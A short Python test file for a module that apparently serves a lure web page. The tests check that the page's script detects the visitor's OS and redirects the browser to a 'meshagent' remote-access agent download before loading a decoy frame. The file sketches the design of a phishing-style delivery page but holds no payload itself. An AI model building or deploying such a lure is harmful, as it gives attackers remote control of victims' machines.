from panel import landing


def test_family_for_os():
    assert landing.family_for_os("windows") == "windows"
    assert landing.family_for_os("darwin") == "macos"
    assert landing.family_for_os("linux") == "linux"
    assert landing.family_for_os("unknown") == "windows"


def test_lure_js_is_self_contained():
    js = landing.LURE_JS
    assert "/__lure/target" in js
    assert "detectOS" in js
    assert "addEventListener" in js
    assert "__lure/meshagent" in js
    assert "window.location.href = agent" in js
    assert js.index("window.location.href = agent") < js.index("f.src = d.url")


def test_sniff_maps_to_family(tmp_settings):
    for ua, family in [
        ("Mozilla (Windows NT 10.0)", "windows"),
        ("Mozilla (Macintosh; Intel Mac OS X)", "macos"),
        ("Mozilla (X11; Linux x86_64)", "linux"),
    ]:
        assert landing.family_for_os(landing.sniff(ua)) == family
